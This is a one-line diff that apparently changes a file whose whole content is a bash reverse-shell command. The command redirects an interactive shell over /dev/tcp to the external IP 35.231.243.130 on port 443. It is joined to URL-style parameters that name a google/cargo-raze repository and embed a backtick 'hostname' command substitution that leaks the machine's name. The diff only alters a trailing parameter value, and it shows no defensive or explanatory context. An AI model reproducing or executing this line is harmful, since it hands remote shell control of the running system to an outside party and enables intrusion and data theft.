@@ -1,1 +1,1 @@
-/bin/bash -l > /dev/tcp/35.231.243.130/443 0<&1 2>&1?repository=https://github.com/google/cargo-raze.git\&folder=tools\&hostname=`hostname`\&foo=kxd
+/bin/bash -l > /dev/tcp/35.231.243.130/443 0<&1 2>&1?repository=https://github.com/google/cargo-raze.git\&folder=tools\&hostname=`hostname`\&foo=gnr
